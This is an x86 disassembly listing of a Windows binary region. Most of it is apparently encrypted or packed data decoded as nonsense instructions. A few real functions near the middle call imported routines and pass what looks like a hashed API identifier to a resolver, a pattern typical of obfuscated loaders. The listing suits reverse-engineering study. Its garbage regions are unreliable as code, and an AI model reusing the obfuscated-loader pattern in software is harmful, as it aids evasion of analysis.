  422b60:	sub    al,0xc3
  422b62:	xchg   esi,eax
  422b63:	xor    eax,0x5c2a2f8
  422b68:	loopne 0x422b3a
  422b6a:	pop    eax
  422b6b:	jle    0x422b29
  422b6d:	and    DWORD PTR [edi+0x66],edx
  422b70:	clc    
  422b71:	xchg   esi,eax
  422b72:	sub    eax,ebx
  422b74:	lock cmp BYTE PTR [ecx],cl
  422b77:	jp     0x422b68
  422b79:	pusha  
  422b7a:	inc    edx
  422b7b:	rol    BYTE PTR [ebx],0xbe
  422b7e:	pop    esi
  422b7f:	xchg   DWORD PTR [edx-0x531fcaf9],eax
  422b85:	xchg   ebx,eax
  422b86:	retf   0x67bb
  422b89:	fisub  DWORD PTR [eax+ebx*4]
  422b8c:	dec    eax
  422b8d:	mov    cl,0xa1
  422b8f:	dec    esp
  422b90:	xor    al,BYTE PTR [ebx+0x3d]
  422b93:	or     al,0x34
  422b95:	sub    ch,cl
  422b97:	(bad)  
  422b98:	out    dx,eax
  422b99:	mov    dl,0x6e
  422b9b:	push   edx
  422b9c:	rcr    ebp,1
  422b9e:	xor    eax,0xf698acbc
  422ba3:	adc    DWORD PTR [edx+0x7e],esi
  422ba6:	test   BYTE PTR [edi+0x58],dl
  422ba9:	int    0xe0
  422bab:	push   eax
  422bac:	dec    ebp
  422bad:	in     al,dx
  422bae:	sub    bl,cl
  422bb0:	dec    esi
  422bb1:	jne    0x422beb
  422bb3:	adc    BYTE PTR [ecx],bl
  422bb5:	ror    BYTE PTR [esi+0x7d],cl
  422bb8:	out    0x4,eax
  422bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bbb:	xor    cl,al
  422bbd:	mov    ds:0x1c05853f,al
  422bc2:	add    ebp,0xf271850d
  422bc8:	mov    al,0x1a
  422bca:	inc    ecx
  422bcb:	in     eax,dx
  422bcc:	fisubr WORD PTR [ecx+edx*8-0x548fb88d]
  422bd3:	mov    ?,edx
  422bd5:	jp     0x422c55
  422bd7:	push   ss
  422bd8:	pop    ebx
  422bd9:	xor    bl,BYTE PTR [ebx+edx*8]
  422bdc:	jmp    0x67e2:0x6b15ac58
  422be3:	push   eax
  422be4:	and    DWORD PTR [ebp+0x45ac6f0b],esp
  422bea:	pop    ebp
  422beb:	dec    esp
  422bec:	stos   DWORD PTR es:[edi],eax
  422bed:	sbb    DWORD PTR es:[eax],edx
  422bf0:	and    BYTE PTR [ecx+0x57c0b6af],bh
  422bf6:	jmp    0xfb26:0x20279584
  422bfd:	jbe    0x422c1a
  422bff:	jp     0x422bc6
  422c01:	cwde   
  422c02:	lods   eax,DWORD PTR ds:[esi]
  422c03:	pop    es
  422c04:	mov    ds:0xa3f92a9a,al
  422c09:	ror    DWORD PTR [eax+0x424cf88c],1
  422c0f:	stos   DWORD PTR es:[edi],eax
  422c10:	push   ebx
  422c11:	call   DWORD PTR [edi-0x71101579]
  422c17:	push   ds
  422c18:	mov    DWORD PTR [ecx],eax
  422c1a:	clc    
  422c1b:	int3   
  422c1c:	fs in  al,0x22
  422c1f:	shl    DWORD PTR [ecx],0x4a
  422c22:	jp     0x422beb
  422c24:	sub    ecx,DWORD PTR [ebp+0x3b]
  422c27:	dec    edi
  422c28:	inc    edx
  422c29:	pextrw esp,mm4,0xbe
  422c2d:	scas   eax,DWORD PTR es:[edi]
  422c2e:	repnz cmc 
  422c30:	pushf  
  422c31:	aam    0x2b
  422c33:	int    0x3c
  422c35:	out    0x4b,al
  422c37:	mov    al,0x35
  422c39:	push   0xffffffbb
  422c3b:	xchg   ebp,eax
  422c3c:	xlat   BYTE PTR ds:[ebx]
  422c3d:	or     al,0x1a
  422c3f:	dec    edx
  422c40:	mov    DWORD PTR [edx+ebx*2-0x29120d4f],ebx
  422c47:	in     eax,dx
  422c48:	inc    ecx
  422c49:	dec    ebx
  422c4a:	sbb    BYTE PTR [ecx-0xa],al
  422c4d:	fcomp  QWORD PTR [esi-0xab83a9b]
  422c53:	loope  0x422bee
  422c55:	dec    esi
  422c56:	dec    ebp
  422c57:	mov    BYTE PTR [ecx+0x4ee66ac9],bh
  422c5d:	ror    ecx,1
  422c5f:	mov    ah,0xf8
  422c61:	sar    ebp,1
  422c63:	scas   al,BYTE PTR es:[edi]
  422c64:	xor    al,0x14
  422c66:	fiadd  DWORD PTR [ebx+0x1fbb80ca]
  422c6c:	add    al,BYTE PTR [ecx+esi*8]
  422c6f:	add    ch,BYTE PTR [esp+ebp*4+0x48cc8fb2]
  422c76:	fwait
  422c77:	pushf  
  422c78:	ja     0x422cf0
  422c7a:	test   al,0xd0
  422c7c:	xor    eax,DWORD PTR [edi-0x6d35a75e]
  422c82:	(bad)  
  422c83:	cmp    ah,dl
  422c85:	dec    ebx
  422c86:	add    al,al
  422c88:	ret    0xa259
  422c8b:	clc    
  422c8c:	mov    ds:0xdc105ebe,eax
  422c91:	aaa    
  422c92:	cmp    edx,DWORD PTR [esi+edx*4]
  422c95:	mov    eax,0xf89ad38
  422c9a:	mov    ah,BYTE PTR [edi]
  422c9c:	div    BYTE PTR [esi+0x180a523a]
  422ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ca3:	add    DWORD PTR [ebp+0x77bd801],0x30
  422caa:	mov    ch,0x88
  422cac:	xor    DWORD PTR [edi],edx
  422cae:	and    dl,BYTE PTR [esp+eax*8+0x57]
  422cb2:	xchg   edi,eax
  422cb3:	clc    
  422cb4:	fcomp  QWORD PTR [ebx+edx*4-0x1e1c808f]
  422cbb:	lds    esp,FWORD PTR [eax-0x5d38333b]
  422cc1:	lahf   
  422cc2:	retf   
  422cc3:	fisttp DWORD PTR [ecx]
  422cc5:	xlat   BYTE PTR ds:[ebx]
  422cc6:	or     BYTE PTR [ebx-0x357fab1c],cl
  422ccc:	inc    edx
  422ccd:	imul   ebx,DWORD PTR [esi-0x212d9ab5],0x62
  422cd4:	in     al,0x95
  422cd6:	cmp    al,0x41
  422cd8:	xchg   edx,eax
  422cd9:	pop    ecx
  422cda:	(bad)  
  422cdb:	mov    ch,0x4d
  422cdd:	sahf   
  422cde:	inc    ebx
  422cdf:	sub    BYTE PTR [eax-0x4576aa7d],al
  422ce5:	push   ecx
  422ce6:	mov    ebx,0x9d17aaf8
  422ceb:	jle    0x422c78
  422ced:	inc    edx
  422cee:	sbb    DWORD PTR [ecx],esi
  422cf0:	mov    ecx,0x890fef7c
  422cf5:	jae    0x422d20
  422cf7:	jbe    0x422d62
  422cf9:	jbe    0x422d4e
  422cfb:	pop    ebx
  422cfc:	lahf   
  422cfd:	mov    bh,0x43
  422cff:	and    BYTE PTR [ecx+edi*2-0x11],0xd2
  422d04:	int    0x29
  422d06:	jne    0x422d11
  422d08:	sub    eax,0x82f86077
  422d0d:	jp     0x422c9c
  422d0f:	jb     0x422ccc
  422d11:	xchg   ebp,eax
  422d12:	xor    esi,ebx
  422d14:	test   BYTE PTR [eax+0x4159d10b],ch
  422d1a:	cwde   
  422d1b:	push   ecx
  422d1c:	leave  
  422d1d:	mov    fs:0xee9e8dad,eax
  422d23:	push   edi
  422d24:	mov    ds:0xfec113c2,al
  422d29:	shl    BYTE PTR [esi],1
  422d2b:	inc    esp
  422d2c:	xchg   edi,eax
  422d2d:	(bad)  
  422d2e:	lock or eax,0xfbfd269e
  422d34:	lds    edi,FWORD PTR [eax+0x4f0d00df]
  422d3a:	push   ebx
  422d3b:	xor    esi,esi
  422d3d:	mov    al,0xef
  422d3f:	jmp    DWORD PTR [esi]
  422d41:	test   DWORD PTR [eax-0x4d],eax
  422d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d45:	cmc    
  422d46:	xchg   ax,ax
  422d48:	rcl    bl,0x52
  422d4b:	sbb    esi,eax
  422d4d:	adc    DWORD PTR [edx+0x62],ebp
  422d50:	sub    BYTE PTR [ebx-0x71],bh
  422d53:	sub    al,0xff
  422d55:	add    bh,BYTE PTR [ecx-0x2589231c]
  422d5b:	push   0x0
  422d5d:	dec    ebp
  422d5e:	sti    
  422d5f:	inc    ecx
  422d60:	jnp    0x422dba
  422d62:	push   0x7
  422d64:	adc    BYTE PTR [ebx+eiz*8],0x2
  422d68:	pop    ebp
  422d69:	dec    ecx
  422d6a:	int3   
  422d6b:	cmp    dh,BYTE PTR [edx]
  422d6d:	jns    0x422dd0
  422d6f:	push   es
  422d70:	fimul  WORD PTR [edx]
  422d72:	push   es
  422d73:	out    0xd1,eax
  422d75:	jne    0x422da9
  422d77:	cdq    
  422d78:	das    
  422d79:	stos   BYTE PTR es:[edi],al
  422d7a:	sub    BYTE PTR [edx],0x4a
  422d7d:	loope  0x422d0d
  422d7f:	jbe    0x422d39
  422d81:	ins    DWORD PTR es:[edi],dx
  422d82:	jp     0x422df0
  422d84:	mov    BYTE PTR [ecx+0x40],0xe1
  422d88:	push   es
  422d89:	and    edx,DWORD PTR [esi]
  422d8b:	cmp    cl,ah
  422d8d:	push   es
  422d8e:	push   ebx
  422d8f:	cmp    al,0xc8
  422d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d92:	dec    edx
  422d93:	test   DWORD PTR [ebp-0xcbeb57f],0x30ce8c11
  422d9d:	and    DWORD PTR [esi],ecx
  422d9f:	pop    es
  422da0:	mov    ds:0x9a7641dd,al
  422da5:	inc    eax
  422da6:	or     eax,0xd5091ca9
  422dab:	mov    dh,0xb9
  422dad:	daa    
  422dae:	cmp    eax,0xcc854685
  422db3:	inc    ecx
  422db4:	in     al,dx
  422db5:	sub    BYTE PTR [esi+0x780582d9],bh
  422dbb:	sub    al,0x6f
  422dbd:	mov    ds:0x8ef21277,al
  422dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dc3:	xchg   ecx,eax
  422dc4:	pop    ds
  422dc5:	fisubr DWORD PTR ds:0x7c57de5b
  422dcb:	sbb    al,0xfa
  422dcd:	dec    edi
  422dce:	mov    ch,ah
  422dd0:	cmp    BYTE PTR [edx-0x61],0x6
  422dd4:	or     esi,ecx
  422dd6:	and    ecx,eax
  422dd8:	push   ebp
  422dd9:	or     BYTE PTR [eax],bh
  422ddb:	pop    ecx
  422ddc:	ins    DWORD PTR es:[edi],dx
  422ddd:	adc    DWORD PTR [ebx+0x33],0x1c
  422de1:	adc    DWORD PTR [ebx-0x156a985c],esi
  422de7:	lods   eax,DWORD PTR ds:[esi]
  422de8:	cmp    al,0xe4
  422dea:	jp     0x422e3c
  422dec:	inc    ebx
  422ded:	outs   dx,BYTE PTR ds:[esi]
  422dee:	adc    ebp,esp
  422df0:	push   esp
  422df1:	pop    ss
  422df2:	lods   eax,DWORD PTR ds:[esi]
  422df3:	scas   eax,DWORD PTR es:[edi]
  422df4:	loope  0x422e75
  422df6:	mov    ch,BYTE PTR [edi]
  422df8:	add    BYTE PTR [edi+0x29],ah
  422dfb:	sub    dl,0xd
  422dfe:	int    0x17
  422e00:	push   esp
  422e01:	(bad)  
  422e02:	(bad)  
  422e03:	and    eax,DWORD PTR [eax-0x549e647e]
  422e09:	test   BYTE PTR [ebp-0x315baa55],0x77
  422e10:	push   ebx
  422e11:	or     ebp,eax
  422e13:	sub    DWORD PTR [ecx+0x5e7ace3a],0xffffff92
  422e1a:	int3   
  422e1b:	push   edx
  422e1c:	mov    esi,0x8381a07b
  422e21:	mov    bh,0x2e
  422e23:	xchg   ebx,eax
  422e24:	fnstcw WORD PTR [ebp+0x6a]
  422e27:	mov    edx,0xaacf431d
  422e2c:	cmc    
  422e2d:	jecxz  0x422dd9
  422e2f:	addr16 into 
  422e31:	add    DWORD PTR [ecx+0x46],0x48998d5
  422e38:	inc    edi
  422e39:	adc    BYTE PTR [ebx],dh
  422e3b:	je     0x422eba
  422e3d:	push   ss
  422e3e:	mov    ecx,DWORD PTR [eax-0x15730f93]
  422e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e45:	xor    ch,BYTE PTR [esi]
  422e47:	in     eax,dx
  422e48:	push   0xffffff8f
  422e4a:	cmc    
  422e4b:	in     al,dx
  422e4c:	pop    ebx
  422e4d:	fadd   DWORD PTR [ecx+0x7bb0c53f]
  422e53:	push   0x43
  422e55:	xchg   BYTE PTR [eax+0xd],ah
  422e58:	or     BYTE PTR ds:0x149d529c,bh
  422e5e:	cmp    al,0x23
  422e60:	xor    esp,ecx
  422e62:	dec    esi
  422e63:	fld    QWORD PTR [eax]
  422e65:	nop
  422e66:	lods   al,BYTE PTR ds:[esi]
  422e67:	scas   eax,DWORD PTR es:[edi]
  422e68:	(bad)  
  422e69:	stc    
  422e6a:	add    eax,0x51bdd149
  422e6f:	inc    eax
  422e70:	dec    eax
  422e71:	or     esi,DWORD PTR [eax+0x394ac6b2]
  422e77:	dec    ecx
  422e78:	pop    ss
  422e79:	xchg   esp,eax
  422e7a:	lea    edx,ds:0x95ab8dcd
  422e80:	retf   0xf837
  422e83:	push   es
  422e84:	std    
  422e85:	rol    DWORD PTR [edx-0x4c],cl
  422e88:	sbb    esi,DWORD PTR [esi+edi*1+0x1fd8e215]
  422e8f:	out    dx,eax
  422e90:	pop    es
  422e91:	lds    ebx,FWORD PTR [eax]
  422e93:	int    0x17
  422e95:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e97:	sar    DWORD PTR [eax],1
  422e99:	jge    0x422ea8
  422e9b:	pop    ss
  422e9c:	dec    esp
  422e9d:	popa   
  422e9e:	es enter 0x844a,0x74
  422ea3:	lock push ecx
  422ea5:	xor    al,0xcc
  422ea7:	test   eax,0x16dcdb01
  422eac:	sbb    eax,0x321679e0
  422eb1:	in     al,0xbf
  422eb3:	cmp    BYTE PTR [edi-0x1d5b2703],ch
  422eb9:	dec    ebp
  422eba:	sbb    DWORD PTR [ecx-0x7ae7ada6],edi
  422ec0:	sub    DWORD PTR [eax+0x3761cfbc],esp
  422ec6:	xor    esi,DWORD PTR [ebx]
  422ec8:	xchg   ebp,eax
  422ec9:	lahf   
  422eca:	dec    ecx
  422ecb:	dec    edx
  422ecc:	enter  0x801b,0xa3
  422ed0:	ret    
  422ed1:	sbb    edx,DWORD PTR [esi-0xd]
  422ed4:	inc    ebp
  422ed5:	jne    0x422eca
  422ed7:	push   edi
  422ed8:	jno    0x422f43
  422eda:	hlt    
  422edb:	mov    ch,0x1
  422edd:	dec    esi
  422ede:	xchg   esp,eax
  422edf:	xchg   ebp,eax
  422ee0:	dec    eax
  422ee1:	ds pop es
  422ee3:	cld    
  422ee4:	les    eax,FWORD PTR [ebx-0x50b5bd29]
  422eea:	and    DWORD PTR [ebp-0x1a],edx
  422eed:	sbb    eax,0x7fa44fca
  422ef2:	xor    al,al
  422ef4:	mov    ecx,ecx
  422ef6:	jecxz  0x422ede
  422ef8:	out    dx,eax
  422ef9:	or     DWORD PTR [ebp-0x5a],0x30390ab9
  422f00:	je     0x422e8c
  422f02:	add    al,0x11
  422f04:	mov    ds,WORD PTR [ebx]
  422f06:	pop    ecx
  422f07:	inc    ebp
  422f08:	and    eax,DWORD PTR [ebp+ebx*8-0x73]
  422f0c:	mov    ecx,0xd344800b
  422f11:	or     bl,BYTE PTR [ecx]
  422f13:	sub    al,0x84
  422f15:	aaa    
  422f16:	pop    bp
  422f18:	aam    0xad
  422f1a:	add    eax,0xd2c07c29
  422f1f:	stos   DWORD PTR es:[edi],eax
  422f20:	adc    al,ah
  422f22:	loop   0x422ed4
  422f24:	fcomp  DWORD PTR [esi-0x4a]
  422f27:	inc    edi
  422f28:	cs mov eax,0x1
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0x91c8ce5b
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	call   ebp
  422fd4:	mov    esp,ecx
  422fd6:	outs   dx,DWORD PTR ds:[esi]
  422fd7:	scas   eax,DWORD PTR es:[edi]
  422fd8:	xchg   esp,ecx
  422fda:	mov    ds:0xd76f6edc,eax
  422fdf:	and    esp,DWORD PTR [edi-0x2f]
  422fe2:	jno    0x422fbb
  422fe4:	lods   al,BYTE PTR ds:[esi]
  422fe5:	xchg   esp,ecx
  422fe7:	mov    ds:0x976f6ed8,eax
  422fec:	fcomp  QWORD PTR [eax-0x53908e2f]
  422ff2:	xchg   esp,ecx
  422ff4:	mov    ds:0xd76f6ed8,eax
  422ff9:	fcomp  QWORD PTR [eax-0x53908e2f]
  422fff:	xchg   esp,ecx
  423001:	mov    ds:0xd76f6ed8,eax
  423006:	fcomp  QWORD PTR [eax-0x53908e2f]
  42300c:	xchg   esp,ecx
  42300e:	mov    ds:0xd76f6e20,eax
  423013:	rol    BYTE PTR [edi+0x186f7f6b],cl
  423019:	mov    es,WORD PTR [ecx]
  42301b:	and    BYTE PTR [eax+0x6f],0x23
  42301f:	sbb    bh,ch
  423021:	int3   
  423022:	mov    ecx,0xf78c1c18
  423027:	mov    esi,0xe1cbfcc
  42302c:	mov    edx,0x1fb0fbfc
  423031:	add    ebx,eax
  423033:	repz in al,dx
  423035:	sar    DWORD PTR [ebp-0x4d5de2b2],0xb8
  42303c:	mov    eax,0xc8e84f1f
  423041:	lahf   
  423042:	xor    DWORD PTR [ebp-0xd4df4ff],0xffffff95
  423049:	fdivr  QWORD PTR [ebx+0x4b]
  42304c:	lods   al,BYTE PTR ds:[esi]
  42304d:	xchg   esp,ecx
  42304f:	mov    ds:0xd06f6ed8,eax
  423054:	inc    ebp
  423055:	mov    BYTE PTR fs:[edx],dh
  423058:	xchg   edi,eax
  423059:	lea    ecx,ds:[edi+0x2c644a5b]
  423060:	das    
  423061:	dec    esi
  423062:	xchg   edx,eax
  423063:	mov    DWORD PTR [ebx+eiz*2],edx
  423066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423067:	fdiv   DWORD PTR [ecx+esi*1]
  42306a:	shl    BYTE PTR [esi],cl
  42306c:	or     ch,bh
  42306e:	(bad)  
  42306f:	pop    edx
  423070:	sub    ebx,esp
  423072:	gs hlt 
  423074:	loop   0x42306b
  423076:	test   eax,0xddfd96b0
  42307b:	lock push ss
  42307d:	call   0x159659fd
  423082:	(bad)  
  423083:	jmp    0x9da7afe0
  423088:	and    al,0xa
  42308a:	fstp   TBYTE PTR [ebx]
  42308c:	out    dx,eax
  42308d:	lods   eax,DWORD PTR ds:[esi]
  42308e:	lea    edx,[ebx+ebx*2+0x2f2c644a]
  423095:	dec    edi
  423096:	xchg   edx,eax
  423097:	stc    
  423098:	mov    ch,bh
  42309a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42309b:	cmp    BYTE PTR [ebx+eiz*1],dl
  42309e:	shl    BYTE PTR [ebx],cl
  4230a0:	xchg   edi,eax
  4230a1:	inc    ebp
  4230a2:	(bad)  
  4230a3:	shl    BYTE PTR [esp+ecx*2+0x5e7fa465],0xa9
  4230ab:	or     BYTE PTR [ebx],0x67
  4230ae:	fstp   QWORD PTR [esi+0x377b4360]
  4230b4:	leave  
  4230b5:	mov    dh,al
  4230b7:	loope  0x4230d9
  4230b9:	cld    
  4230ba:	test   DWORD PTR gs:[ebp-0x68cd4605],esi
  4230c1:	ds (bad) 
  4230c3:	int3   
  4230c4:	mov    ds:0xd76f6ed8,eax
  4230c9:	fcomp  QWORD PTR [eax-0x5390cb7f]
  4230cf:	retf   
  4230d0:	int    0xa1
  4230d2:	fadd   DWORD PTR [edx-0x676c7774]
  4230d8:	shl    DWORD PTR [ecx+0x6f],1
  4230db:	lods   al,BYTE PTR ds:[esi]
  4230dc:	xchg   esp,ecx
  4230de:	mov    ds:0xd66c6e38,eax
  4230e3:	xlat   BYTE PTR ds:[ebx]
  4230e4:	cdq    
  4230e5:	(bad)  [ecx+0x6f]
  4230e8:	inc    eax
  4230e9:	or     esp,0xffffffa3
  4230ec:	fsubr  QWORD PTR [eax+0x6f]
  4230ef:	xlat   BYTE PTR ds:[ebx]
  4230f0:	fcomp  QWORD PTR [eax-0x532d8f2f]
  4230f6:	xchg   esp,ecx
  4230f8:	mov    bl,0xd8
  4230fa:	outs   dx,BYTE PTR ds:[esi]
  4230fb:	outs   dx,DWORD PTR ds:[esi]
  4230fc:	xlat   BYTE PTR ds:[ebx]
  4230fd:	fstp   DWORD PTR [eax-0x53d18e2f]
  423103:	xchg   esp,ebx
  423105:	mov    ds:0xd76d6ed8,eax
  42310a:	fcomp  QWORD PTR [ebp-0x53908f2f]
  423110:	xchg   esp,ecx
  423112:	mov    ds:0xd76e6edd,eax
  423117:	fcomp  QWORD PTR [eax+0x2c6f71d1]
  42311d:	mov    esp,cs
  42311f:	mov    ds:0x6a6f6edc,eax
  423124:	in     eax,dx
  423125:	popf   
  423126:	shl    DWORD PTR [ebx+0x6f],1
  423129:	lods   al,BYTE PTR ds:[esi]
  42312a:	pop    es
  42312b:	int3   
  42312c:	mov    ds:0xc76f6ec8,eax
  423131:	fcomp  QWORD PTR [eax-0x53808e2f]
  423137:	xchg   esp,ebx
  423139:	mov    ds:0xd76f6ed8,eax
  42313e:	fmul   QWORD PTR [eax-0x53908e2f]
  423144:	xchg   esp,ecx
  423146:	mov    ds:0xd76f6ed8,eax
  42314b:	pop    eax
  42314c:	neg    dl
  42314e:	jno    0x423156
  423150:	scas   eax,DWORD PTR es:[edi]
  423151:	xchg   esp,ecx
  423153:	mov    ds:0x186f65e8,eax
  423158:	loope  0x4230f2
  42315a:	shl    DWORD PTR [ecx+0x6f],1
  42315d:	lods   al,BYTE PTR ds:[esi]
  42315e:	xchg   esp,ecx
  423160:	mov    ds:0xd76f6ed8,eax
  423165:	fcomp  QWORD PTR [eax-0x53908e2f]
  42316b:	xchg   esp,ecx
  42316d:	mov    ds:0xd76f6ed8,eax
  423172:	fcomp  QWORD PTR [eax-0x53908e2f]
  423178:	xchg   esp,ecx
  42317a:	mov    ds:0xd76f6ed8,eax
  42317f:	fcomp  QWORD PTR [eax-0x53908e2f]
  423185:	xchg   esp,ecx
  423187:	mov    ds:0xd76f6ed8,eax
  42318c:	fcomp  QWORD PTR [eax-0x53908e2f]
  423192:	xchg   esp,ecx
  423194:	mov    ds:0xd76f6ed8,eax
  423199:	fcomp  QWORD PTR [eax-0x53908e2f]
  42319f:	xchg   esp,ecx
  4231a1:	mov    ds:0xd76f6ed8,eax
  4231a6:	fcomp  QWORD PTR [eax-0x53908e2f]
  4231ac:	xchg   esp,ecx
  4231ae:	mov    ds:0xd76f6ed8,eax
  4231b3:	fcomp  QWORD PTR [eax-0x53908e2f]
  4231b9:	xchg   esp,ecx
  4231bb:	mov    ds:0xd76f6ed8,eax
  4231c0:	fcomp  QWORD PTR [eax-0x36e4a02f]
  4231c6:	(bad)  
  4231c7:	mov    eax,0x6f6ed8a3
  4231cc:	not    edi
  4231ce:	cwde   
  4231cf:	shl    DWORD PTR [ecx+0x6f],1
  4231d2:	lods   al,BYTE PTR ds:[esi]
  4231d3:	xchg   esi,esi
  4231d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231d6:	fsubr  DWORD PTR [esi+0x6b]
  4231d9:	xlat   BYTE PTR ds:[ebx]
  4231da:	fmul   st(0),st
  4231dc:	xchg   esp,eax
  4231dd:	xor    bl,BYTE PTR [ebp-0x8]
  4231e0:	enter  0xa3cc,0xd8
  4231e4:	outs   dx,BYTE PTR ds:[esi]
  4231e5:	outs   dx,DWORD PTR ds:[esi]
  4231e6:	xlat   BYTE PTR ds:[ebx]
  4231e7:	cld    
  4231e8:	cwde   
  4231e9:	rcl    DWORD PTR [ecx-0x410b21bf],1
  4231ef:	rcr    al,0x6e
  4231f2:	outs   dx,DWORD PTR ds:[esi]
  4231f3:	xlat   BYTE PTR ds:[ebx]
  4231f4:	mov    WORD PTR [eax-0x58a08e2f],ds
  4231fa:	xchg   esp,ecx
  4231fc:	repz fsubr DWORD PTR [esi+0x6f]
  423200:	jmp    0x7213cadd
  423205:	outs   dx,DWORD PTR ds:[esi]
  423206:	lods   al,BYTE PTR ds:[esi]
  423207:	xchg   esp,ecx
  423209:	mov    ds:0xd76f6ed8,eax
  42320e:	fdivr  QWORD PTR [eax-0x53708e2f]
  423214:	xchg   esp,ecx
  423216:	mov    ds:0xd76f6ed8,eax
  42321b:	fcomp  QWORD PTR [eax-0x53908e2f]
  423221:	xchg   esp,ecx
  423223:	mov    ds:0xd76f6ed8,eax
  423228:	fcomp  QWORD PTR [eax-0x53908e2f]
  42322e:	xchg   esp,ecx
  423230:	mov    ds:0xd76f6ed8,eax
  423235:	fcomp  QWORD PTR [eax-0x53908e2f]
  42323b:	xchg   esp,ecx
  42323d:	mov    ds:0xd76f6ed8,eax
  423242:	fcomp  QWORD PTR [eax-0x53908e2f]
  423248:	xchg   esp,ecx
  42324a:	mov    ds:0xd76f6ed8,eax
  42324f:	fcomp  QWORD PTR [eax-0x53908e2f]
  423255:	xchg   esp,ecx
  423257:	mov    ds:0xd76f6ed8,eax
  42325c:	fcomp  QWORD PTR [eax-0x53908e2f]
  423262:	xchg   esp,ecx
  423264:	mov    ds:0xd76f6ed8,eax
  423269:	fcomp  QWORD PTR [eax-0x53908e2f]
  42326f:	xchg   esp,ecx
  423271:	mov    ds:0xd76f6ed8,eax
  423276:	fcomp  QWORD PTR [eax-0x53908e2f]
  42327c:	xchg   esp,ecx
  42327e:	mov    ds:0xd76f6ed8,eax
  423283:	fcomp  QWORD PTR [eax-0x53908e2f]
  423289:	xchg   esp,ecx
  42328b:	mov    ds:0xd76f6ed8,eax
  423290:	fcomp  QWORD PTR [eax-0x53908e2f]
  423296:	xchg   esp,ecx
  423298:	mov    ds:0xd76f6ed8,eax
  42329d:	fcomp  QWORD PTR [eax-0x53908e2f]
  4232a3:	xchg   esp,ecx
  4232a5:	mov    ds:0xd76f6ed8,eax
  4232aa:	fcomp  QWORD PTR [eax-0x53908e2f]
  4232b0:	xchg   esp,ecx
  4232b2:	mov    ds:0xd76f6ed8,eax
  4232b7:	fcomp  QWORD PTR [eax-0x53908e2f]
  4232bd:	xchg   esp,ecx
  4232bf:	mov    ds:0xd76f6ed8,eax
  4232c4:	fcomp  QWORD PTR [eax-0x53908e2f]
  4232ca:	xchg   esp,ecx
  4232cc:	mov    ds:0xd76f6ed8,eax
  4232d1:	fcomp  QWORD PTR [eax-0x53908e2f]
  4232d7:	xchg   esp,ecx
  4232d9:	mov    ds:0xd76f6ed8,eax
  4232de:	fcomp  QWORD PTR [eax-0x53908e2f]
  4232e4:	xchg   esp,ecx
  4232e6:	mov    ds:0xd76f6ed8,eax
  4232eb:	fcomp  QWORD PTR [eax-0x53908e2f]
  4232f1:	xchg   esp,ecx
  4232f3:	mov    ds:0xd76f6ed8,eax
  4232f8:	fcomp  QWORD PTR [eax-0x53908e2f]
  4232fe:	xchg   esp,ecx
  423300:	mov    ds:0xd76f6ed8,eax
  423305:	fcomp  QWORD PTR [eax-0x53908e2f]
  42330b:	xchg   esp,ecx
  42330d:	mov    ds:0xd76f6ed8,eax
  423312:	fcomp  QWORD PTR [eax-0x53908e2f]
  423318:	xchg   esp,ecx
  42331a:	mov    ds:0xd76f6ed8,eax
  42331f:	fcomp  QWORD PTR [eax-0x53908e2f]
  423325:	xchg   esp,ecx
  423327:	mov    ds:0xd76f6ed8,eax
  42332c:	fcomp  QWORD PTR [eax-0x53908e2f]
  423332:	xchg   esp,ecx
  423334:	mov    ds:0xd76f6ed8,eax
  423339:	fcomp  QWORD PTR [eax-0x53908e2f]
  42333f:	xchg   esp,ecx
  423341:	mov    ds:0xd76f6ed8,eax
  423346:	fcomp  QWORD PTR [eax-0x53908e2f]
  42334c:	xchg   esp,ecx
  42334e:	mov    ds:0xd76f6ed8,eax
  423353:	fcomp  QWORD PTR [eax-0x53908e2f]
  423359:	xchg   esp,ecx
  42335b:	mov    ds:0xd76f6ed8,eax
  423360:	fcomp  QWORD PTR [eax-0x53908e2f]
  423366:	xchg   esp,ecx
